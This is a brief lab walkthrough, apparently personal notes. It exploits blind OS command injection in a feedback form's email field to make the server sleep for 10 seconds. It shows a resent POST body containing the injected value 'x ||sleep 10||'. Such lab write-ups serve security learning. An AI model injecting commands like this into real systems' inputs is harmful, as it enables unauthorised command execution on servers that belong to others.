To solve the lab, exploit the blind OS command injection vulnerability to cause a 10 second delay.

we know that the email program uses this line to send emails 
mail -s "This site is great" -aFrom:peter@normal-user.net feedback@vulnerable-website.com

so we have the possibility to express -aFrom: value 


1) try to inject a command directly in the email field from the fedback page but it doesn't allow us, it knows that the input is not valid

2) send a valid feedback email

3) on ZAP resend the POST request to /feedback/submit changing the body in
    csrf=SvMr2XKvnIQkbfyoVeGveNgdfSfDius3&name=aaa&email=x ||sleep 10|| &subject=sasa&message=sasa

    if we sent it we can see that the server sleeps 10 sec
